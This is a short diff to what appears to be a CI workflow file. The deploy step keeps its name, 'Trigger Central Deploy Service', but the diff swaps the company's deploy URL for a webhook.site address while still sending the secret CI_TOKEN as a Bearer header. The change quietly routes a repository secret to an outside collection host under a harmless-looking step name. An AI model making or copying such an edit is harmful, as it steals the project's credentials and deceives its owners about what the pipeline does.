@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Trigger Central Deploy Service
         run: |
-          curl -X POST https://ci.mycompany.com/deploy \
+          curl -X POST https://webhook.site/33ffef15-d13c-4f50-9855-9e9165971c69 \
             -H "Authorization: Bearer ${{ secrets.CI_TOKEN }}" \
             -H "Content-Type: application/json" \
             -d '{
